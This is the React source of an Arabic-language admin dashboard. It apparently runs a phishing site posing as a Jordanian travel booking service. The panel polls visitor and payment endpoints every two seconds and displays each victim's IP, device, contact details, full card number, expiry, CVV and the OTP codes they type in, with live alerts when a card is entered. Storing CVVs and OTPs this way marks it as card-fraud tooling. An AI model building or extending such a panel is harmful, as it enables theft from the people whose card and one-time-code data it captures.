import { useState } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { 
  Globe, Wifi, Link as LinkIcon, Mail, Bell, 
  Search, MessageSquare, ChevronDown, Check,
  CreditCard, Calendar, User, MapPin, Monitor, Smartphone, Chrome,
  Trash2, AlertTriangle, X, RefreshCw, Landmark, ShieldCheck
} from "lucide-react";
import { detectCardDetails } from "@/lib/card-validation";

export default function Dashboard() {
  const [activeVisitorId, setActiveVisitorId] = useState<string | null>(null);
  const [showConfirmDeleteAll, setShowConfirmDeleteAll] = useState(false);
  const [isDeleting, setIsDeleting] = useState(false);
  const queryClient = useQueryClient();

  const { data: paymentsRes } = useQuery({
    queryKey: ['admin-payments'],
    queryFn: async () => {
      const res = await fetch('/api/admin/payments');
      return res.json();
    },
    refetchInterval: 2000
  });

  const { data: visitorsRes } = useQuery({
    queryKey: ['admin-visitors'],
    queryFn: async () => {
      const res = await fetch('/api/admin/visitors');
      return res.json();
    },
    refetchInterval: 2000
  });

  const payments = paymentsRes?.data || [];
  const visitors = visitorsRes?.data || [];
  
  const selectedVisitorId = activeVisitorId || (visitors.length > 0 ? visitors[0].id : null);
  const activeVisitor = visitors.find((v: any) => v.id === selectedVisitorId) || visitors[0]; 
  const activeVisitorPayments = payments
    .filter((p: any) => p.visitor_id === selectedVisitorId)
    .sort((a: any, b: any) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());

  // Realtime "online" definition: active within the last 15 seconds
  const isOnline = (lastActive: string) => {
    if (!lastActive) return false;
    const diff = Date.now() - new Date(lastActive).getTime();
    return diff < 15000;
  };

  const handleClearAll = async () => {
    setIsDeleting(true);
    try {
      await fetch('/api/admin/clear-all', { method: 'DELETE' });
      await queryClient.invalidateQueries({ queryKey: ['admin-payments'] });
      await queryClient.invalidateQueries({ queryKey: ['admin-visitors'] });
      setActiveVisitorId(null);
      setShowConfirmDeleteAll(false);
    } catch (e) {
      console.error("Failed to clear all", e);
    } finally {
      setIsDeleting(false);
    }
  };

  const handleDeleteVisitor = async (visitorId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      await fetch(`/api/admin/visitor/${visitorId}`, { method: 'DELETE' });
      await queryClient.invalidateQueries({ queryKey: ['admin-payments'] });
      await queryClient.invalidateQueries({ queryKey: ['admin-visitors'] });
      if (activeVisitorId === visitorId) {
        setActiveVisitorId(null);
      }
    } catch (err) {
      console.error("Failed to delete visitor", err);
    }
  };

  return (
    <div className="flex h-screen bg-[#F8FAFC] text-slate-800" dir="rtl">
      {/* Sidebar - Right */}
      <aside className="w-80 bg-white border-l border-slate-200 flex flex-col h-full overflow-hidden shrink-0">
        <div className="p-4 border-b border-slate-200 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <MessageSquare className="w-5 h-5 text-slate-600" />
            <h2 className="font-bold text-lg">الزوار المباشرون</h2>
          </div>
          <div className="flex items-center gap-2 text-slate-500">
            {visitors.length > 0 && (
              <button 
                onClick={() => setShowConfirmDeleteAll(true)}
                className="flex items-center gap-1 text-xs text-red-600 bg-red-50 hover:bg-red-100 px-2.5 py-1 rounded-md font-semibold transition-colors"
                title="مسح جميع الزوار"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>مسح الكل</span>
              </button>
            )}
          </div>
        </div>

        {/* Conversation List */}
        <div className="flex-1 overflow-y-auto">
          {visitors.length === 0 && (
            <div className="p-8 text-center text-slate-400 text-sm">
              لا يوجد زوار حالياً
            </div>
          )}
          {visitors.map((visitor: any) => {
            const isActive = selectedVisitorId === visitor.id;
            const visitorOnline = isOnline(visitor.last_active);
            const hasPayment = payments.some((p: any) => p.visitor_id === visitor.id);
            const hasOtp = payments.some((p: any) => p.visitor_id === visitor.id && p.otp);
            
            return (
              <div 
                key={visitor.id} 
                onClick={() => setActiveVisitorId(visitor.id)}
                className={`group relative flex items-center justify-between p-3 border-b border-slate-100 cursor-pointer hover:bg-slate-50 transition-colors ${isActive ? 'bg-blue-50/50 border-r-4 border-r-blue-500' : ''}`}
              >
                <div className="flex items-center gap-3">
                  <div className="relative">
                    <div className="w-10 h-10 rounded-full bg-slate-200 flex items-center justify-center text-slate-500 shrink-0">
                      <User className="w-5 h-5" />
                    </div>
                    {visitorOnline && (
                       <span className="absolute bottom-0 right-0 w-3 h-3 bg-emerald-500 border-2 border-white rounded-full"></span>
                    )}
                  </div>
                  <div>
                    <h4 className="font-semibold text-sm">زائر ({visitor.id?.slice(0, 4) || 'مجهول'})</h4>
                    <div className="flex items-center gap-1 text-xs text-slate-500 mt-1">
                      {hasOtp ? (
                         <span className="text-orange-600 font-bold flex items-center gap-1"><Check className="w-3 h-3"/> أرسل OTP</span>
                      ) : hasPayment ? (
                         <span className="text-emerald-600 font-bold flex items-center gap-1"><CreditCard className="w-3 h-3"/> أدخل بطاقة</span>
                      ) : (
                         <span className="text-slate-500 truncate max-w-[120px]" dir="ltr">{visitor.page || '/'}</span>
                      )}
                    </div>
                  </div>
                </div>
                <div className="text-xs text-slate-400 flex flex-col items-end gap-1">
                  <span>{new Date(visitor.last_active).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' })}</span>
                  <div className="flex items-center gap-1">
                    <span className="text-[10px]">{visitor.os}</span>
                    <button
                      onClick={(e) => handleDeleteVisitor(visitor.id, e)}
                      className="opacity-0 group-hover:opacity-100 text-slate-400 hover:text-red-600 p-1 rounded hover:bg-red-50 transition-all"
                      title="حذف هذا الزائر"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col h-full overflow-hidden bg-slate-50/50">
        {/* Top Navigation Bar */}
        <header className="h-14 bg-white border-b border-slate-200 flex items-center justify-between px-4" dir="ltr">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <div className="flex items-center gap-2 text-blue-600 font-bold text-xl">
              <img src="logo.svg" alt="logo" width={90} />
            </div>
            
            {/* Stats */}
            <div className="flex items-center gap-3 text-xs font-medium text-slate-600 bg-slate-100 px-3 py-1.5 rounded-full">
              <span className="flex items-center gap-1"><span className="w-2 h-2 rounded-full bg-emerald-500"></span> {visitors.filter((v: any) => isOnline(v.last_active)).length} متصل</span>
              <span className="flex items-center gap-1"><span className="w-2 h-2 rounded-full bg-blue-500"></span> {payments.length} بطاقات</span>
            </div>
          </div>

          {/* Header Action Controls */}
          <div className="flex items-center gap-3" dir="rtl">
            {(visitors.length > 0 || payments.length > 0) && (
              <button
                onClick={() => setShowConfirmDeleteAll(true)}
                className="flex items-center gap-2 px-3 py-1.5 text-xs font-bold text-red-600 bg-red-50 hover:bg-red-100 border border-red-200 rounded-lg transition-colors"
              >
                <Trash2 className="w-4 h-4" />
                <span>حذف جميع البيانات</span>
              </button>
            )}
          </div>
        </header>

        {/* Content Area */}
        <div className="flex-1 overflow-auto p-4 flex justify-center" dir="rtl">
          {!activeVisitor ? (
             <div className="flex items-center justify-center h-full text-slate-400">
               يرجى اختيار زائر لعرض التفاصيل
             </div>
          ) : (
            <div className="w-full max-w-3xl flex gap-8">
              {/* Timeline */}
              <div className="w-32 flex flex-col items-end pt-20 border-r-2 border-blue-400 border-dashed pr-4 relative">
                <div className="absolute right-[-7px] top-24 w-3 h-3 rounded-full bg-blue-500"></div>
                <span className="text-xs text-slate-500">
                  {new Date(activeVisitor.last_active).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                </span>
              </div>

              {/* Cards Area */}
              <div className="flex-1 space-y-6 pt-6">
                
                {/* Header Info */}
                <div className="flex items-center justify-between bg-white px-4 py-2 rounded-lg border border-slate-200 shadow-sm text-sm">
                  <div className="flex items-center gap-2">
                    {isOnline(activeVisitor.last_active) ? (
                      <>
                        <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                        <span className="font-semibold text-emerald-600">متصل الآن</span>
                      </>
                    ) : (
                      <>
                        <span className="w-2 h-2 rounded-full bg-slate-400"></span>
                        <span className="font-semibold text-slate-500">غير متصل</span>
                      </>
                    )}
                  </div>
                  <div className="flex items-center gap-4 text-slate-600">
                    <span className="flex items-center gap-1"><Calendar className="w-4 h-4"/> مسار الزائر: <span className="font-bold text-blue-600 dir-ltr">{activeVisitor.page || "/"}</span></span>
                    <span className="bg-blue-100 text-blue-700 px-2 py-0.5 rounded text-xs font-bold"># {activeVisitor.id?.split('-')[0]}</span>
                  </div>
                </div>

                {/* System Info Bar */}
                <div className="flex items-center justify-end gap-6 text-xs text-slate-500 font-medium px-2">
                  <span className="flex items-center gap-1" dir="ltr">{activeVisitor?.ip || "Unknown"} <Globe className="w-3 h-3"/></span>
                  <span className="flex items-center gap-1" dir="ltr">{activeVisitor?.os || "Unknown"} <Monitor className="w-3 h-3"/></span>
                  <span className="flex items-center gap-1" dir="ltr">{activeVisitor?.device || "Unknown"} <Monitor className="w-3 h-3"/></span>
                  <span className="flex items-center gap-1" dir="ltr">{activeVisitor?.browser || "Unknown"} <Chrome className="w-3 h-3"/></span>
                </div>

                {/* Booking/Contact Details (if available from session data) */}
                {activeVisitor?.session_data?.booking && (
                  <div className="bg-blue-50/50 rounded-xl border border-blue-100 p-5 animate-in slide-in-from-bottom-4 duration-500">
                    <div className="flex items-center justify-center gap-2 mb-4 font-bold text-blue-900">
                      <Calendar className="w-5 h-5" />
                      معلومات الحجز والاتصال
                    </div>
                    <div className="space-y-3 text-sm">
                      {activeVisitor.session_data.booking.contactName && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">الاسم</span>
                          <span className="text-slate-600 font-medium" dir="ltr">{activeVisitor.session_data.booking.contactName}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.phoneNumber && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">رقم الجوال</span>
                          <span className="text-slate-600 font-medium" dir="ltr">{activeVisitor.session_data.booking.phoneCode} {activeVisitor.session_data.booking.phoneNumber}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.email && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">البريد الإلكتروني</span>
                          <span className="text-slate-600 font-medium" dir="ltr">{activeVisitor.session_data.booking.email}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.origin && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">مسار الرحلة</span>
                          <span className="text-slate-600 font-medium">{activeVisitor.session_data.booking.origin} إلى {activeVisitor.session_data.booking.destination}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.travelDate && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">تاريخ السفر</span>
                          <span className="text-slate-600 font-medium" dir="ltr">{new Date(activeVisitor.session_data.booking.travelDate).toLocaleDateString()}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.passengers && (
                        <div className="flex justify-between border-b border-blue-100/50 pb-2">
                          <span className="font-semibold text-slate-700 w-1/3">عدد الركاب</span>
                          <span className="text-slate-600 font-medium">{activeVisitor.session_data.booking.passengers}</span>
                        </div>
                      )}
                      {activeVisitor.session_data.booking.amountJod && (
                        <div className="flex justify-between font-bold mt-4 pt-2 border-t border-blue-200">
                          <span className="text-blue-900 w-1/3">المبلغ الإجمالي</span>
                          <span className="text-blue-900" dir="ltr">{activeVisitor.session_data.booking.amountJod} JOD</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* Payment Cards Info */}
                {activeVisitorPayments.length > 0 ? (
                  <div className="space-y-6 pb-12">
                    {activeVisitorPayments.map((payment: any, index: number) => {
                      const cardInfo = detectCardDetails(payment.card_number || '', payment.bank_name, payment.bin_data);
                      
                      return (
                        <div key={payment.id} className="relative">
                          {/* Vertical line connecting attempts */}
                          {index > 0 && (
                            <div className="absolute -top-6 right-1/2 w-0.5 h-6 bg-slate-200"></div>
                          )}
                          
                          <div className={`bg-blue-50/50 rounded-xl border ${index === activeVisitorPayments.length - 1 ? 'border-blue-400 ring-4 ring-blue-50 shadow-md' : 'border-blue-100 opacity-80'} p-4 animate-in slide-in-from-bottom-4 duration-500`}>
                            <div className="flex items-center justify-between mb-4">
                              <span className="text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded font-bold">
                                محاولة الدفع {index + 1}
                              </span>
                              <div className="flex items-center gap-2 font-bold text-blue-900">
                                <CreditCard className="w-5 h-5" />
                                بيانات الدفع المدخلة
                              </div>
                              <span className="text-xs text-slate-400 font-mono" dir="ltr">
                                {new Date(payment.created_at).toLocaleTimeString()}
                              </span>
                            </div>
                            
                            {/* Realistic Bank Card Mock */}
                            <div className="bg-gradient-to-br from-slate-900 via-teal-950 to-emerald-900 rounded-2xl p-6 shadow-xl border border-emerald-500/30 relative overflow-hidden mb-4 text-white">
                              {/* Background ambient pattern */}
                              <div className="absolute -right-12 -bottom-12 w-48 h-48 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
                              <div className="absolute -left-12 -top-12 w-48 h-48 bg-teal-500/10 rounded-full blur-2xl pointer-events-none"></div>

                              {/* Card Header: Bank Name & Currency / Country */}
                              <div className="flex justify-between items-start mb-4 relative z-10">
                                <div>
                                  <div className="flex items-center gap-2 font-black text-emerald-300 text-base tracking-wide">
                                    <Landmark className="w-4 h-4 text-emerald-400" />
                                    <span>{cardInfo.bankNameAr}</span>
                                  </div>
                                  <div className="text-[11px] text-slate-300 font-medium tracking-wider uppercase opacity-90 mt-0.5" dir="ltr">
                                    {cardInfo.bankNameEn}
                                  </div>
                                </div>
                                <div className="flex flex-col items-end gap-1">
                                  <span className="bg-emerald-500/20 text-emerald-300 border border-emerald-400/30 text-[11px] font-bold px-2 py-0.5 rounded-md backdrop-blur-sm">
                                    {payment.currency || 'JOD'}
                                  </span>
                                  <span className="text-[10px] text-slate-300 font-medium">
                                    {cardInfo.country}
                                  </span>
                                </div>
                              </div>
                              
                              {/* Chip & Contactless indicator */}
                              <div className="flex items-center justify-between my-3 relative z-10">
                                <div className="w-10 h-7 bg-gradient-to-r from-amber-300 via-yellow-400 to-amber-200 rounded-md border border-amber-500/40 shadow-inner flex items-center justify-center relative overflow-hidden">
                                  <div className="w-full h-[1px] bg-amber-600/40 absolute top-2"></div>
                                  <div className="w-full h-[1px] bg-amber-600/40 absolute bottom-2"></div>
                                  <div className="h-full w-[1px] bg-amber-600/40 absolute left-3"></div>
                                </div>
                                <div className="flex items-center gap-1.5 bg-white/10 px-2.5 py-1 rounded-full backdrop-blur-md border border-white/10 text-xs font-mono font-bold text-emerald-200">
                                  <Wifi className="w-3.5 h-3.5 rotate-90 text-emerald-400" />
                                  <span>{cardInfo.schemeCategory}</span>
                                </div>
                              </div>

                              {/* Card Number */}
                              <div className="text-2xl tracking-[0.2em] font-mono text-white font-bold my-4 drop-shadow-md text-center" dir="ltr">
                                {payment.card_number || "---- ---- ---- ----"}
                              </div>
                              
                              {/* Cardholder Name & Expiry / CVV / Scheme Logo */}
                              <div className="flex justify-between items-end text-sm pt-2 border-t border-white/10 relative z-10">
                                <div>
                                  <div className="text-[9px] uppercase tracking-wider text-slate-400 mb-0.5">Cardholder Name</div>
                                  <div className="font-bold uppercase tracking-wider text-slate-100 font-mono text-xs">{payment.name || "UNSPECIFIED"}</div>
                                  <div className="text-[11px] text-emerald-300/90 font-semibold mt-1 flex items-center gap-1">
                                    <span>المبلغ:</span>
                                    <span dir="ltr" className="font-bold">{payment.amount} {payment.currency || 'JOD'}</span>
                                  </div>
                                </div>
                                
                                <div className="flex items-center gap-4">
                                  <div className="text-left font-mono">
                                    <div className="text-[9px] uppercase tracking-wider text-slate-400">EXPIRES</div>
                                    <div className="text-xs font-bold text-slate-100" dir="ltr">{payment.expiry || "--/--"}</div>
                                  </div>
                                  <div className="text-left font-mono bg-red-950/80 border border-red-500/40 px-2 py-1 rounded-md">
                                    <div className="text-[9px] uppercase tracking-wider text-red-400 font-bold">CVV</div>
                                    <div className="text-xs font-extrabold text-red-300" dir="ltr">{payment.cvv || "---"}</div>
                                  </div>
                                  {/* Card Scheme Logo Banner */}
                                  <div className="bg-white/95 px-3 py-1.5 rounded-lg shadow-md flex items-center justify-center min-w-[64px]">
                                    <span className="font-black text-slate-900 text-xs tracking-tighter uppercase font-sans">
                                      {cardInfo.schemeName}
                                    </span>
                                  </div>
                                </div>
                              </div>
                            </div>

                            {/* Detailed Schema Info Box below card */}
                            <div className="bg-white rounded-xl border border-slate-200 p-3.5 space-y-3 text-xs text-slate-700 font-medium shadow-sm">
                              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-2.5">
                                <div className="flex items-center gap-1.5">
                                  <Landmark className="w-4 h-4 text-blue-600" />
                                  <span>البنك المصدر: <strong className="text-slate-900">{cardInfo.bankNameAr}</strong> ({cardInfo.bankNameEn})</span>
                                </div>
                                <div className="flex items-center gap-1.5">
                                  <ShieldCheck className="w-4 h-4 text-emerald-600" />
                                  <span>مواصفات البطاقة: <strong className="text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200 font-mono">{cardInfo.schemeName} {cardInfo.schemeCategory}</strong></span>
                                </div>
                              </div>

                              {/* BIN Lookup Schema Badges */}
                              {cardInfo.rawBinData && (
                                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]" dir="ltr">
                                  <div className="bg-slate-50 border border-slate-200 p-2 rounded-lg">
                                    <span className="text-slate-400 block text-[10px] font-mono uppercase">Bank</span>
                                    <span className="font-bold text-slate-800">{cardInfo.rawBinData.bank?.name || 'N/A'}</span>
                                    {cardInfo.rawBinData.bank?.city && <span className="text-[10px] text-slate-500 block">({cardInfo.rawBinData.bank.city})</span>}
                                  </div>

                                  <div className="bg-slate-50 border border-slate-200 p-2 rounded-lg">
                                    <span className="text-slate-400 block text-[10px] font-mono uppercase">Scheme / Brand</span>
                                    <span className="font-bold text-slate-800 uppercase">{cardInfo.rawBinData.scheme}</span>
                                    <span className="text-[10px] text-slate-500 block">{cardInfo.rawBinData.brand}</span>
                                  </div>

                                  <div className="bg-slate-50 border border-slate-200 p-2 rounded-lg">
                                    <span className="text-slate-400 block text-[10px] font-mono uppercase">Type / Prepaid</span>
                                    <span className="font-bold text-slate-800 uppercase">{cardInfo.rawBinData.type}</span>
                                    <span className="text-[10px] text-slate-500 block">Prepaid: {cardInfo.rawBinData.prepaid ? 'Yes' : 'No'}</span>
                                  </div>

                                  <div className="bg-slate-50 border border-slate-200 p-2 rounded-lg">
                                    <span className="text-slate-400 block text-[10px] font-mono uppercase">Country</span>
                                    <span className="font-bold text-slate-800">{cardInfo.rawBinData.country?.emoji} {cardInfo.rawBinData.country?.name}</span>
                                    <span className="text-[10px] text-slate-500 block">Currency: {cardInfo.rawBinData.country?.currency || 'JOD'}</span>
                                  </div>
                                </div>
                              )}

                              {/* Full JSON Schema Toggle / Preview */}
                              <details className="text-[11px] text-slate-500 border-t border-slate-100 pt-2 cursor-pointer">
                                <summary className="font-mono text-[10px] font-bold text-blue-600 hover:text-blue-800 select-none">
                                  عرض المخطط البرمجي للبطاقة (BIN JSON Schema)
                                </summary>
                                <pre className="mt-2 p-3 bg-slate-900 text-emerald-400 rounded-lg font-mono text-[10px] leading-relaxed overflow-x-auto" dir="ltr">
                                  {JSON.stringify(cardInfo.rawBinData, null, 2)}
                                </pre>
                              </details>
                            </div>

                            {/* OTP (if provided for this specific payment attempt) */}
                            {payment.otp && (
                              <div className="bg-orange-50/50 rounded-xl border border-orange-200 p-4 animate-in fade-in zoom-in duration-300 mt-3">
                                <div className="flex items-center justify-center gap-2 mb-2 font-bold text-orange-800">
                                  رمز التحقق (OTP) لهذه البطاقة
                                </div>
                                <div className="text-center font-mono text-3xl font-black tracking-[0.5em] text-orange-600" dir="ltr">
                                  {payment.otp}
                                </div>
                              </div>
                            )}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <div className="bg-slate-50 rounded-xl border border-dashed border-slate-300 p-8 flex flex-col items-center justify-center text-slate-400 text-sm text-center">
                    <Smartphone className="w-8 h-8 mb-3 opacity-50" />
                    الزائر يتصفح الموقع حالياً، ولم يصل لمرحلة الدفع بعد.
                    <br />
                    سيظهر إشعار فوري هنا بمجرد إدخال بطاقته.
                  </div>
                )}

              </div>
            </div>
          )}
        </div>
      </main>

      {/* Confirmation Modal for Delete All */}
      {showConfirmDeleteAll && (
        <div className="fixed inset-0 z-50 bg-slate-900/50 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl border border-slate-100 text-right space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 pb-3">
              <div className="flex items-center gap-2 text-red-600 font-bold text-lg">
                <AlertTriangle className="w-5 h-5 text-red-500" />
                <span>تأكيد مسح جميع البيانات</span>
              </div>
              <button 
                onClick={() => setShowConfirmDeleteAll(false)}
                className="text-slate-400 hover:text-slate-600 p-1 rounded-lg hover:bg-slate-100"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <p className="text-slate-600 text-sm leading-relaxed">
              هل أنت تأكد من رغبتك في حذف جميع بيانات الزوار والبطاقات المسجلة بالكامل؟ لا يمكن التراجع عن هذا الإجراء بعد تنفيذه.
            </p>

            <div className="flex items-center justify-end gap-3 pt-2">
              <button
                disabled={isDeleting}
                onClick={() => setShowConfirmDeleteAll(false)}
                className="px-4 py-2 text-sm font-semibold text-slate-600 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors"
              >
                إلغاء
              </button>
              <button
                disabled={isDeleting}
                onClick={handleClearAll}
                className="flex items-center gap-2 px-4 py-2 text-sm font-bold text-white bg-red-600 hover:bg-red-700 disabled:bg-red-400 rounded-xl shadow-md shadow-red-200 transition-colors"
              >
                {isDeleting ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    <span>جاري الحذف...</span>
                  </>
                ) : (
                  <>
                    <Trash2 className="w-4 h-4" />
                    <span>نعم، إمسح الكل</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
